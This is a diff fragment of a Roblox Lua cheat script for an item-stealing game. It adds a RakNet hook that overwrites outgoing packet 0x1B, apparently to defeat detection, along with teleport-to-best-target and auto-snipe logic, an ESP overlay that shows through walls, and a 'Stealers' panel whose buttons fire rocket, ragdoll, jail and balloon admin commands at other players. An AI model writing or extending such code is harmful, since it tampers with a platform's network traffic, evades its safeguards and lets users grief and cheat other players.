+        local g = PlayerGui:FindFirstChild("BullysMiniActions")
+        if g and g:FindFirstChild("MiniPanel") then
+            g.MiniPanel.Visible = false
+        end
+    end
+end)
+
+raknet.add_send_hook(function(packet)
+    if packet.PacketId == 0x1B then
+        local data = packet.AsBuffer
+        buffer.writeu32(data, 1, 0xFFFFFFFF)
+        buffer.writeu32(data, 5, 0xFFFFFFFF)
+        buffer.writeu32(data, 9, 0xFFFFFFFF)
+        packet:SetData(data)
+    end
+end)
+task.spawn(function()
+    if not game:IsLoaded() then game.Loaded:Wait() end; task.wait(2)
+    local BL={STOLEN=true,STEAL=true,PURCHASE=true,COMPRAR=true,BUY=true,COLLECT=true,COLETAR=true,CASH=true,VALUE=true,BASE=true,EMPTY=true,GENERATION=true,COMMON=true,UNCOMMON=true,RARE=true,EPIC=true,LEGENDARY=true,DIVINE=true,RAINBOW=true,CURSED=true,GOLD=true,DIAMOND=true,CANDY=true,MUTATION=true}
+    local function cvOk(t) if not t or t=="" then return false end; local c=(t:gsub("<[^>]+>","")):match("^%s*(.-)%s*$") or ""; if #c<=1 then return false end; local u=c:upper(); if u:find("^%$") or u:find("/S$") or u:find("^[%d%.]+") then return false end; return not BL[u] end
+    local function pgv(t) if type(t)~="string" then return nil end; local u=t:gsub("<[^>]+>",""):upper(); if not u:find("%$") or not u:find("/S") then return nil end; local c=u:gsub("%$",""):gsub("/S",""):gsub("%s+",""); local n=tonumber(c:match("[%d%.]+")); if not n then return nil end; if c:find("B") then return n*1e9 elseif c:find("M") then return n*1e6 elseif c:find("K") then return n*1e3 else return n end end
+    local function exM(m) if not m then return nil,nil,0 end; local bN,bG,bV=nil,nil,0; for _,bb in ipairs(m:GetDescendants()) do if bb:IsA("BillboardGui") or bb:IsA("SurfaceGui") then for _,d in ipairs(bb:GetDescendants()) do if d:IsA("TextLabel") and d.Text then local v=pgv(d.Text); if v and v>bV then bV=v;bG=d.Text:gsub("<[^>]+>",""); local co=d.Parent; if co then local f=nil; for _,s in ipairs(co:GetChildren()) do if s:IsA("TextLabel") and s.Name=="DisplayName" then local c2=(s.Text or ""):gsub("<[^>]+>",""):match("^%s*(.-)%s*$"); if cvOk(c2) then f=c2;break end end end; if not f then local bt,bl=nil,0; for _,s in ipairs(co:GetChildren()) do if s:IsA("TextLabel") then local c2=(s.Text or ""):gsub("<[^>]+>",""):match("^%s*(.-)%s*$") or ""; if cvOk(c2) and #c2>bl then bt,bl=c2,#c2 end end end; if bt then f=bt end end; if f then bN=f end end end end end end end; return bN,bG,bV end
+    local function scan() local res,vis={},{}; local deb=Workspace:FindFirstChild("Debris") or Workspace; for _,c in ipairs(deb:GetChildren()) do if c:IsA("Model") or c:IsA("BasePart") then local n,g,gv=exM(c); if gv and gv>0 then local p=c:IsA("BasePart") and c or (c:IsA("Model") and c.PrimaryPart); if not p then for _,ch in ipairs(c:GetChildren()) do if ch:IsA("BasePart") then p=ch;break end end end; if p then table.insert(vis,{name=n,gen=g,gv=gv,part=p,model=c}) end end end end; for _,obj in ipairs(Workspace:GetDescendants()) do if obj:IsA("ProximityPrompt") and obj.Enabled then local tx=(obj.ActionText or ""):lower(); if tx:find("purchase") or tx:find("comprar") or tx:find("buy") then local pp=obj.Parent; if not pp then continue end; local rp=pp:IsA("Attachment") and pp.Parent or pp; if not(rp and rp:IsA("BasePart")) then continue end; local fN,fG,fGV,fM="Brainrot","",0,nil; local md,mt=15,nil; for _,v in ipairs(vis) do local d=(v.part.Position-rp.Position).Magnitude; if d<md then md=d;mt=v end end; if mt then fN=mt.name or "Brainrot";fG=mt.gen or "";fGV=mt.gv or 0;fM=mt.model else local sr=rp;local cu=rp; while cu and cu.Parent and cu.Parent~=Workspace do sr=cu;cu=cu.Parent end; local n,g,gv=exM(sr); if n then fN=n end; if g then fG=g end; if gv and gv>0 then fGV=gv end; fM=sr end; table.insert(res,{name=fN,gen=fG,gv=fGV,prompt=obj,part=rp,model=fM,uid="conv_"..tostring(obj)}) end end end; return res end
+    while true do local ok2,found=pcall(scan); if ok2 and found then SharedState.ConveyorAnimals=found; local b=-1; for _,e in ipairs(found) do if(e.gv or 0)>b then b=e.gv end end; SharedState.BestConveyorGv=b end; task.wait(0.5) end
+end)
+
+local function tpToBestBrainrot()
+    local bestBase,bestBaseGv=nil,-1; local cache=SharedState.AllAnimalsCache
+    if cache then if Config.AutoTPPriority then for _,pN in ipairs(PRIORITY_LIST) do local sn=pN:lower(); for _,a in ipairs(cache) do if a and a.name and a.name:lower()==sn and a.owner~=LocalPlayer.Name then bestBase=a;bestBaseGv=tonumber(a.genValue) or 0;break end end; if bestBase then break end end end; if not bestBase then for _,a in ipairs(cache) do if a and a.owner~=LocalPlayer.Name then bestBase=a;bestBaseGv=tonumber(a.genValue) or 0;break end end end end
+    SharedState.BestBaseGv=bestBaseGv
+    local bestConv,bestConvGv=nil,-1; for _,e in ipairs(SharedState.ConveyorAnimals or {}) do local gv=tonumber(e.gv) or 0; if e.prompt and e.prompt.Parent and e.prompt.Enabled and e.part and e.part.Parent and gv>bestConvGv then bestConvGv=gv;bestConv=e end end; SharedState.BestConveyorGv=bestConvGv
+    local useConv=bestConv and bestConv.part and bestConv.part.Parent and(not bestBase or bestConvGv>bestBaseGv)
+    if useConv then ShowNotification("TP BEST","ESTEIRA → "..(bestConv.name or "?")); task.spawn(function() local char=LocalPlayer.Character; local hrp=char and char:FindFirstChild("HumanoidRootPart"); local hum=char and char:FindFirstChild("Humanoid"); if not hrp or not hum then return end; local tool=LocalPlayer.Backpack:FindFirstChild(Config.TpSettings.Tool) or char:FindFirstChild(Config.TpSettings.Tool); if tool then hum:EquipTool(tool) end; hrp.AssemblyLinearVelocity=Vector3.new(0,280,0); RunService.Heartbeat:Wait(); hrp.CFrame=CFrame.new(bestConv.part.Position+Vector3.new(0,3,0)) end); return end
+    if bestBase then ShowNotification("TP BEST","BASE → "..bestBase.name); SharedState.SelectedPetData={petName=bestBase.name,mpsText=bestBase.genText,mpsValue=bestBase.genValue,owner=bestBase.owner,plot=bestBase.plot,slot=bestBase.slot,uid=bestBase.uid,mutation=bestBase.mutation,animalData=bestBase}; task.spawn(runAutoSnipe)
+    else ShowNotification("TP BEST","No brainrot found!") end
+end
+_G.tpToBestBrainrot=tpToBestBrainrot
+
+task.spawn(function()
+    -- Stealers HUD: 1.5x bigger (360x420), saves position, individual admin buttons per row, respects blacklist
+    local shGui=Instance.new("ScreenGui"); shGui.Name="XiStealingHUD"; shGui.ResetOnSpawn=false; shGui.Enabled=Config.ShowStealingHUD~=false; shGui.Parent=PlayerGui
+
+    if not Config.Positions.StealersHUD then Config.Positions.StealersHUD = {X=0.8, Y=0.15} end
+
+    local mf=Instance.new("Frame",shGui)
+    mf.Size=UDim2.new(0,360,0,420)
+    mf.Position=UDim2.new(Config.Positions.StealersHUD.X,0,Config.Positions.StealersHUD.Y,0)
+    mf.BackgroundColor3=Theme.Background; mf.BackgroundTransparency=0; mf.BorderSizePixel=0; mf.ClipsDescendants=true
+    Instance.new("UICorner",mf).CornerRadius=UDim.new(0,12)
+    local ms=Instance.new("UIStroke",mf); ms.Color=Color3.fromRGB(40,40,40); ms.Thickness=1.5; ms.Transparency=0.5
+
+    local hdr=Instance.new("Frame",mf); hdr.Size=UDim2.new(1,0,0,38); hdr.BackgroundTransparency=1
+    MakeDraggable(hdr, mf, "StealersHUD")
+
+    local ttl=Instance.new("TextLabel",hdr); ttl.Size=UDim2.new(1,-12,1,0); ttl.Position=UDim2.new(0,10,0,0); ttl.BackgroundTransparency=1; ttl.Text="👁 Stealers"; ttl.Font=Enum.Font.GothamBlack; ttl.TextSize=15; ttl.TextColor3=Theme.TextPrimary; ttl.TextXAlignment=Enum.TextXAlignment.Left
+
+    local sc=Instance.new("ScrollingFrame",mf); sc.Size=UDim2.new(1,-10,1,-44); sc.Position=UDim2.new(0,5,0,42); sc.BackgroundTransparency=1; sc.BorderSizePixel=0; sc.ScrollBarThickness=3; sc.ScrollBarImageColor3=Theme.Accent1
+    local lay=Instance.new("UIListLayout",sc); lay.Padding=UDim.new(0,5)
+
+    local rows={}
+
+    local stealerBtnDefs = {
+        {icon="RKT", cmd="rocket"},
+        {icon="RAG", cmd="ragdoll"},
+        {icon="JAIL", cmd="jail"},
+        {icon="BAL", cmd="balloon"},
+    }
+
+    local function mkRow(plr)
+        local row=Instance.new("Frame",sc); row.Name=plr.Name
+        row.Size=UDim2.new(1,0,0,70); row.BackgroundColor3=Color3.fromRGB(20,20,20); row.BorderSizePixel=0
+        Instance.new("UICorner",row).CornerRadius=UDim.new(0,8)
+        local rowStroke=Instance.new("UIStroke",row); rowStroke.Color=Theme.Accent2; rowStroke.Thickness=1.5; rowStroke.Transparency=0.6
+
+        -- Display name label
+        local dn=Instance.new("TextLabel",row); dn.Size=UDim2.new(1,-10,0,22); dn.Position=UDim2.new(0,10,0,6); dn.BackgroundTransparency=1; dn.Text=plr.DisplayName; dn.Font=Enum.Font.GothamBold; dn.TextSize=14; dn.TextColor3=Color3.new(1,1,1); dn.TextXAlignment=Enum.TextXAlignment.Left
+
+        -- Stealing target label
+        local bl=Instance.new("TextLabel",row); bl.Size=UDim2.new(1,-10,0,14); bl.Position=UDim2.new(0,10,0,30); bl.BackgroundTransparency=1; bl.Text="..."; bl.Font=Enum.Font.GothamMedium; bl.TextSize=11; bl.TextColor3=Color3.fromRGB(255,100,100); bl.TextXAlignment=Enum.TextXAlignment.Left; bl.TextTruncate=Enum.TextTruncate.AtEnd
+
+        -- Individual admin action buttons
+        local btnStartX = 10
+        local btnW = 46
+        local btnH = 22
+        local btnGap = 4
+        for i, def in ipairs(stealerBtnDefs) do
+            local b=Instance.new("TextButton",row)
+            b.Size=UDim2.new(0,btnW,0,btnH)
+            b.Position=UDim2.new(0, btnStartX + (i-1)*(btnW+btnGap), 1, -(btnH+6))
+            b.AutoButtonColor=false
+            b.Text=def.icon; b.TextSize=10; b.Font=Enum.Font.GothamBlack
+            b.TextColor3=Theme.TextPrimary
+            b.BackgroundColor3=Color3.fromRGB(35,37,43); b.BackgroundTransparency=0
+            Instance.new("UICorner",b).CornerRadius=UDim.new(0,6)
+            local bStroke=Instance.new("UIStroke",b); bStroke.Color=Color3.fromRGB(70,70,80); bStroke.Thickness=1.5; bStroke.Transparency=0.4
+
+            b.MouseEnter:Connect(function() b.BackgroundColor3=Color3.fromRGB(50,52,60); bStroke.Transparency=0.1 end)
+            b.MouseLeave:Connect(function() b.BackgroundColor3=Color3.fromRGB(35,37,43); bStroke.Transparency=0.4 end)
+
+            b.MouseButton1Click:Connect(function()
+                if isBlacklisted(plr.Name) then
+                    ShowNotification("STEALERS","⛔ "..plr.Name.." is blacklisted")
+                    return
+                end
+                local adminFunc = _G.runAdminCommand
+                if not adminFunc then
+                    task.wait(0.1)
+                    adminFunc = _G.runAdminCommand
+                end
+                if not adminFunc then
+                    ShowNotification("STEALERS","Admin not ready yet")
+                    return
+                end
+                ShowNotification("STEALERS","→ "..def.cmd.." on "..plr.Name)
+                local ok, result = pcall(adminFunc, plr, def.cmd)
+                if ok and result then
+                    ShowNotification("STEALERS","✓ "..def.cmd.." sent to "..plr.Name)
+                else
+                    ShowNotification("STEALERS","✗ "..def.cmd.." failed on "..plr.Name)
+                end
+            end)
+        end
+
+        -- Blacklist quick button
+        local blBtn=Instance.new("TextButton",row)
+        blBtn.Size=UDim2.new(0,btnW,0,btnH)
+        blBtn.Position=UDim2.new(0, btnStartX + #stealerBtnDefs*(btnW+btnGap), 1, -(btnH+6))
+        blBtn.AutoButtonColor=false; blBtn.Text="BL"; blBtn.TextSize=10; blBtn.Font=Enum.Font.GothamBlack
+        blBtn.TextColor3=Color3.fromRGB(255,200,200)
+        blBtn.BackgroundColor3=Color3.fromRGB(120,20,20); blBtn.BackgroundTransparency=0
+        Instance.new("UICorner",blBtn).CornerRadius=UDim.new(0,6)
+        local blStroke=Instance.new("UIStroke",blBtn); blStroke.Color=Color3.fromRGB(200,50,50); blStroke.Thickness=1.5; blStroke.Transparency=0.3
+        blBtn.MouseEnter:Connect(function() blBtn.BackgroundColor3=Color3.fromRGB(180,30,30); blStroke.Transparency=0.05 end)
+        blBtn.MouseLeave:Connect(function() blBtn.BackgroundColor3=Color3.fromRGB(120,20,20); blStroke.Transparency=0.3 end)
+        blBtn.MouseButton1Click:Connect(function()
+            local already=false
+            for _,n in ipairs(BlacklistedPlayers) do if n:lower()==plr.Name:lower() then already=true;break end end
+            if already then ShowNotification("BLACKLIST",plr.Name.." already blacklisted");return end
+            table.insert(BlacklistedPlayers,plr.Name); Config.Blacklist=BlacklistedPlayers; SaveConfig()
+            if refreshBlacklistUI then refreshBlacklistUI() end
+            blBtn.BackgroundColor3=Color3.fromRGB(30,120,50); blBtn.Text="OK"
+            ShowNotification("BLACKLIST","Blacklisted: "..plr.Name)
+            task.delay(1.2,function() if blBtn and blBtn.Parent then blBtn.BackgroundColor3=Color3.fromRGB(120,20,20);blBtn.Text="BL" end end)
+        end)
+
+        -- Update loop
+        task.spawn(function()
+            while row and row.Parent do
+                if not plr or not plr.Parent or not Players:FindFirstChild(plr.Name) then row:Destroy();return end
+                if plr:GetAttribute("Stealing") then
+                    bl.Text=plr:GetAttribute("StealingIndex") or "..."
+                else
+                    row:Destroy();return
+                end
+                task.wait(0.5)
+            end
+        end)
+        return row
+    end
+
+    while true do
+        task.wait(1)
+        mf.Visible=Config.ShowStealingHUD~=false
+        if mf.Visible then
+            for _,p in ipairs(Players:GetPlayers()) do
+                if p~=LocalPlayer and p:GetAttribute("Stealing") and not rows[p.UserId] then
+                    local r=mkRow(p); rows[p.UserId]=r
+                    r.AncestryChanged:Connect(function() if not r.Parent then rows[p.UserId]=nil end end)
+                end
+            end
+            sc.CanvasSize=UDim2.new(0,0,0,lay.AbsoluteContentSize.Y)
+        end
+    end
+end)
+
+task.spawn(function()
+    local espGui = Instance.new("ScreenGui")
+    espGui.Name = "XiStealingPlotESP"
+    espGui.ResetOnSpawn = false
+    espGui.Enabled = Config.ShowStealingPlotESP ~= false
+    espGui.Parent = PlayerGui
+
+    local byUser = {}
+
+    local SyncStealEsp = nil
+    local AnimalsDataStealEsp = nil
+    local AnimalsSharedStealEsp = nil
+    local function ensureStealEspModules()
+        if not SyncStealEsp then
+            pcall(function()
+                SyncStealEsp = require(ReplicatedStorage:WaitForChild("Packages"):WaitForChild("Synchronizer"))
+            end)
+        end
+        if not AnimalsDataStealEsp then
+            pcall(function()
+                AnimalsDataStealEsp = require(ReplicatedStorage:WaitForChild("Datas"):WaitForChild("Animals"))
+            end)
+        end
+        if not AnimalsSharedStealEsp then
+            pcall(function()
+                AnimalsSharedStealEsp = require(ReplicatedStorage:WaitForChild("Shared"):WaitForChild("Animals"))
+            end)
+        end
+    end
+
+    local function normStealName(s)
+        return tostring(s or ""):lower():gsub("%s+", ""):gsub("[^%w]", "")
+    end
+
+    local function stealIdxMatchesAnimal(stealIdx, adIndex, displayName)
+        if stealIdx == nil or stealIdx == "" then return false end
+        local si = tostring(stealIdx)
+        local sil = si:lower()
+        if adIndex then
+            local ai = tostring(adIndex)
+            if ai == si or ai:lower() == sil then return true end
+        end
+        if displayName then
+            local d = tostring(displayName)
+            local dl = d:lower()
+            if dl == sil or dl:find(sil, 1, true) or sil:find(dl, 1, true) then return true end
+            if normStealName(d) == normStealName(si) then return true end
+        end
+        local AD = AnimalsDataStealEsp
+        if AD then
+            local infDirect = AD[si]
+            if type(infDirect) == "table" and infDirect.DisplayName and displayName then
+                if infDirect.DisplayName:lower() == displayName:lower() or normStealName(infDirect.DisplayName) == normStealName(displayName) then
+                    return true
+                end
+            end
+            if adIndex and AD[adIndex] and type(AD[adIndex]) == "table" and AD[adIndex].DisplayName then
+                local disp = AD[adIndex].DisplayName
+                if disp:lower() == sil or normStealName(disp) == normStealName(si) then return true end
+            end
+            for key, inf in pairs(AD) do
+                if type(inf) == "table" and inf.DisplayName then
+                    if key == si or key:lower() == sil then
+                        if not displayName or inf.DisplayName:lower() == displayName:lower() or normStealName(inf.DisplayName) == normStealName(displayName) then
+                            return true
+                        end
+                    end
+                    if inf.DisplayName:lower() == sil or normStealName(inf.DisplayName) == normStealName(si) then
+                        if adIndex and (key == adIndex or key:lower() == tostring(adIndex):lower()) then return true end
+                        if displayName and (normStealName(inf.DisplayName) == normStealName(displayName) or inf.DisplayName:lower() == displayName:lower()) then
+                            return true
+                        end
+                    end
+                end
+            end
+        end
+        return false
+    end
+
+    local function findPlotForPlayer(plr)
+        if not plr then return nil end
+        local plots = Workspace:FindFirstChild("Plots")
+        if not plots then return nil end
+        local dn = (plr.DisplayName or ""):lower()
+        local un = (plr.Name or ""):lower()
+        for _, plot in ipairs(plots:GetChildren()) do
+            local sign = plot:FindFirstChild("PlotSign")
+            if sign then
+                local surfaceGui = sign:FindFirstChildWhichIsA("SurfaceGui", true)
+                if surfaceGui then
+                    local label = surfaceGui:FindFirstChildWhichIsA("TextLabel", true)
+                    if label then
+                        local text = label.Text:lower()
+                        if (dn ~= "" and text:find(dn, 1, true)) or (un ~= "" and text:find(un, 1, true)) then
+                            return plot
+                        end
+                    end
+                end
+            end
+        end
+        local pkg = ReplicatedStorage:FindFirstChild("Packages")
+        local syncMod = pkg and pkg:FindFirstChild("Synchronizer")
+        if syncMod then
+            local okReq, Sync = pcall(function() return require(syncMod) end)
+            if okReq and Sync then
+                for _, plot in ipairs(plots:GetChildren()) do
+                    local okCh, ch = pcall(function() return Sync:Get(plot.Name) end)
+                    if okCh and ch then
+                        local owner = ch:Get("Owner")
+                        if owner then
+                            if typeof(owner) == "Instance" and owner:IsA("Player") and owner == plr then
+                                return plot
+                            end
+                            if type(owner) == "table" and owner.UserId == plr.UserId then
+                                return plot
+                            end
+                        end
+                    end
+                end
+            end
+        end
+        return nil
+    end
+
+    local function getPlotSignAdorneePart(plot)
+        if not plot then return nil end
+        local sign = plot:FindFirstChild("PlotSign")
+        if not sign then return nil end
+        if sign:IsA("BasePart") then return sign end
+        if sign:IsA("Model") then
+            return sign.PrimaryPart or sign:FindFirstChildWhichIsA("BasePart", true)
+        end
+        return sign:FindFirstChildWhichIsA("BasePart", true)
+    end
+
+    local function resolveStolenPetEntry(plr, stealIdx)
+        if stealIdx == nil or stealIdx == "" then return nil end
+        ensureStealEspModules()
+        local myPlot = findPlotForPlayer(plr)
+        local myPlotName = myPlot and myPlot.Name
+        local cache = SharedState.AllAnimalsCache
+        local best, bestGv = nil, -1
+
+        local function considerEntry(entry, gv)
+            if not entry or not entry.plot then return end
+            if myPlotName and entry.plot == myPlotName then return end
+            if entry.owner and entry.owner == plr.Name then return end
+            local g = tonumber(gv) or tonumber(entry.genValue) or 0
+            if g > bestGv then
+                bestGv = g
+                best = entry
+            end
+        end
+
+        if cache then
+            for _, a in ipairs(cache) do
+                if a and a.name and a.owner and a.owner ~= plr.Name then
+                    if stealIdxMatchesAnimal(stealIdx, nil, a.name) then
+                        considerEntry(a, a.genValue)
+                    end
+                end
+            end
+        end
+
+        if best then return best end
+
+        if not SyncStealEsp or not AnimalsDataStealEsp then return nil end
+        local plots = Workspace:FindFirstChild("Plots")
+        if not plots then return nil end
+
+        for _, plot in ipairs(plots:GetChildren()) do
+            if not myPlotName or plot.Name ~= myPlotName then
+                local okCh, ch = pcall(function() return SyncStealEsp:Get(plot.Name) end)
+                if okCh and ch then
+                    local owner = ch:Get("Owner")
+                    local ownerName = nil
+                    if typeof(owner) == "Instance" and owner:IsA("Player") then
+                        ownerName = owner.Name
+                    elseif type(owner) == "table" and owner.Name then
+                        ownerName = owner.Name
+                    end
+                    if ownerName ~= plr.Name then
+                        local al = ch:Get("AnimalList")
+                        if type(al) == "table" then
+                            for slot, ad in pairs(al) do
+                                if type(ad) == "table" and ad.Index then
+                                    local aInfo = AnimalsDataStealEsp[ad.Index]
+                                    local disp = (aInfo and aInfo.DisplayName) or ad.Index
+                                    if stealIdxMatchesAnimal(stealIdx, ad.Index, disp) then
+                                        local gv = 0
+                                        pcall(function()
+                                            if AnimalsSharedStealEsp then
+                                                gv = AnimalsSharedStealEsp:GetGeneration(ad.Index, ad.Mutation, ad.Traits, nil)
+                                            end
+                                        end)
+                                        considerEntry({
+                                            name = disp,
+                                            index = ad.Index,
+                                            genText = "",
+                                            genValue = gv,
+                                            mutation = ad.Mutation,
+                                            traits = "",
+                                            owner = ownerName or "?",
+                                            plot = plot.Name,
+                                            slot = tostring(slot),
+                                            uid = plot.Name .. "_" .. tostring(slot),
+                                        }, gv)
+                                    end
+                                end
+                            end
+                        end
+                    end
+                end
+            end
+        end
+        return best
+    end
+
+    local function clearRow(uid)
+        local r = byUser[uid]
+        if not r then return end
+        if r.bill and r.bill.Parent then r.bill:Destroy() end
+        byUser[uid] = nil
+    end
+
+    Players.PlayerRemoving:Connect(function(plr)
+        clearRow(plr.UserId)
+    end)
+
+    while true do
+        task.wait(0.35)
+        local enabled = Config.ShowStealingPlotESP ~= false
+        espGui.Enabled = enabled
+        if not enabled then
+            local clearIds = {}
+            for uid in pairs(byUser) do table.insert(clearIds, uid) end
+            for _, uid in ipairs(clearIds) do clearRow(uid) end
+        else
+            local attachFn = _G.XiAttachPet3DPreview
+            local active = {}
+            for _, plr in ipairs(Players:GetPlayers()) do
+                if plr ~= LocalPlayer and plr:GetAttribute("Stealing") then
+                    local idx = plr:GetAttribute("StealingIndex")
+                    if idx ~= nil and idx ~= "" then
+                        local plot = findPlotForPlayer(plr)
+                        local part = getPlotSignAdorneePart(plot)
+                        if part and part:IsDescendantOf(Workspace) then
+                            active[plr.UserId] = true
+                            local petEntry = resolveStolenPetEntry(plr, idx)
+                            local petName = petEntry and petEntry.name or tostring(idx)
+                            local stealKey = tostring(idx) .. "|" .. tostring(petEntry and petEntry.uid or "") .. "|" .. part:GetFullName()
+                            local row = byUser[plr.UserId]
+                            if row and (row.stealKey ~= stealKey or row.adornee ~= part) then
+                                clearRow(plr.UserId)
+                                row = nil
+                            end
+                            if not byUser[plr.UserId] then
+                                local bb = Instance.new("BillboardGui")
+                                bb.Name = "StealPlotESP_" .. plr.Name
+                                bb.Adornee = part
+                                bb.AlwaysOnTop = true
+                                bb.Size = UDim2.new(0, 210, 0, 132)
+                                bb.StudsOffset = Vector3.new(0, 7, 0)
+                                bb.MaxDistance = 650
+                                bb.LightInfluence = 0
+                                bb.Parent = espGui
+
+                                local root = Instance.new("Frame")
+                                root.Name = "Root"
+                                root.Size = UDim2.new(1, 0, 1, 0)
+                                root.BackgroundColor3 = Theme.Background
+                                root.BackgroundTransparency = 0.12
+                                root.BorderSizePixel = 0
+                                root.Parent = bb
+                                Instance.new("UICorner", root).CornerRadius = UDim.new(0, 10)
+                                local stroke = Instance.new("UIStroke", root)
+                                stroke.Color = Color3.fromRGB(140, 140, 140)
+                                stroke.Thickness = 1.2
+                                stroke.Transparency = 0.4
+
+                                local title = Instance.new("TextLabel")
+                                title.Name = "Title"
+                                title.Size = UDim2.new(1, -10, 0, 22)
+                                title.Position = UDim2.new(0, 5, 0, 4)
+                                title.BackgroundTransparency = 1
+                                title.Font = Enum.Font.GothamBlack
+                                title.TextSize = 11
+                                title.TextColor3 = Theme.TextPrimary
+                                title.TextXAlignment = Enum.TextXAlignment.Left
+                                title.TextTruncate = Enum.TextTruncate.AtEnd
+                                title.Text = plr.DisplayName .. " → " .. petName
+                                title.Parent = root
+
+                                local sub = Instance.new("TextLabel")
+                                sub.Name = "Sub"
+                                sub.Size = UDim2.new(1, -10, 0, 14)
+                                sub.Position = UDim2.new(0, 5, 0, 26)
+                                sub.BackgroundTransparency = 1
+                                sub.Font = Enum.Font.GothamMedium
+                                sub.TextSize = 9
+                                sub.TextColor3 = Color3.fromRGB(185, 185, 185)
+                                sub.TextXAlignment = Enum.TextXAlignment.Left
+                                sub.Text = "Stealing"
+                                sub.Parent = root
+
+                                local previewHost = Instance.new("Frame")
+                                previewHost.Name = "PreviewHost"
+                                previewHost.Size = UDim2.new(1, -10, 0, 80)
+                                previewHost.Position = UDim2.new(0, 5, 0, 42)
+                                previewHost.BackgroundTransparency = 1
+                                previewHost.BorderSizePixel = 0
+                                previewHost.Parent = root
+
+                                if attachFn then
+                                    local petData = {
+                                        petName = petName,
+                                        -- previewCacheKey por nome do pet para reutilizar entre jogadores
+                                        previewCacheKey = petName ~= "" and petName:lower() or nil,
+                                        animalData = {
+                                            plot = petEntry and petEntry.plot or nil,
+                                            slot = petEntry and petEntry.slot or nil,
+                                            -- Passa Index em maiúsculo E minúsculo para garantir RS lookup
+                                            Index = petEntry and (petEntry.index or petEntry.Index) or nil,
+                                            index = petEntry and (petEntry.index or petEntry.Index) or nil,
+                                        }
+                                    }
+                                    task.defer(function()
+                                        if not previewHost.Parent then return end
+                                        local okAttach = pcall(function()
+                                            attachFn(previewHost, petData, {
+                                                Size = UDim2.new(1, 0, 1, 0),
+                                                Position = UDim2.new(0, 0, 0, 0),
+                                                CornerRadius = 8,
+                                                Fov = 34,
+                                                ForceLiveModelOnly = false,
+                                                ForceFallbackModel = false,
+                                                ForceEmbeddedAnimation = false,
+                                            })
+                                        end)
+                                        if (not okAttach) and previewHost.Parent then
+                                            local no3dErr = Instance.new("TextLabel")
+                                            no3dErr.Size = UDim2.new(1, 0, 1, 0)
+                                            no3dErr.BackgroundTransparency = 0.35
+                                            no3dErr.BackgroundColor3 = Theme.SurfaceHighlight
+                                            no3dErr.Text = "Failed to load 3D preview"
+                                            no3dErr.Font = Enum.Font.GothamBold
+                                            no3dErr.TextSize = 10
+                                            no3dErr.TextColor3 = Theme.TextSecondary
+                                            no3dErr.Parent = previewHost
+                                            Instance.new("UICorner", no3dErr).CornerRadius = UDim.new(0, 8)
+                                        end
+                                    end)
+                                else
+                                    local no3d = Instance.new("TextLabel")
+                                    no3d.Size = UDim2.new(1, 0, 1, 0)
+                                    no3d.BackgroundTransparency = 0.35
+                                    no3d.BackgroundColor3 = Theme.SurfaceHighlight
+                                    no3d.Text = "Loading preview..."
+                                    no3d.Font = Enum.Font.GothamBold
+                                    no3d.TextSize = 10
+                                    no3d.TextColor3 = Theme.TextSecondary
+                                    no3d.Parent = previewHost
+                                    Instance.new("UICorner", no3d).CornerRadius = UDim.new(0, 8)
+                                end
+
+                                byUser[plr.UserId] = { bill = bb, adornee = part, stealKey = stealKey }
+                            else
+                                row = byUser[plr.UserId]
+                                if row and row.bill and row.bill.Parent then
+                                    local rootFrame = row.bill:FindFirstChild("Root")
+                                    if rootFrame then
+                                        local t = rootFrame:FindFirstChild("Title")
+                                        if t and t:IsA("TextLabel") then
+                                            t.Text = plr.DisplayName .. " → " .. petName
+                                        end
+                                    end
+                                end
+                            end
+                        end
+                    end
+                end
+            end
+            local stale = {}
+            for uid in pairs(byUser) do
+                if not active[uid] then table.insert(stale, uid) end
+            end
+            for _, uid in ipairs(stale) do clearRow(uid) end
+        end
+    end
+end)
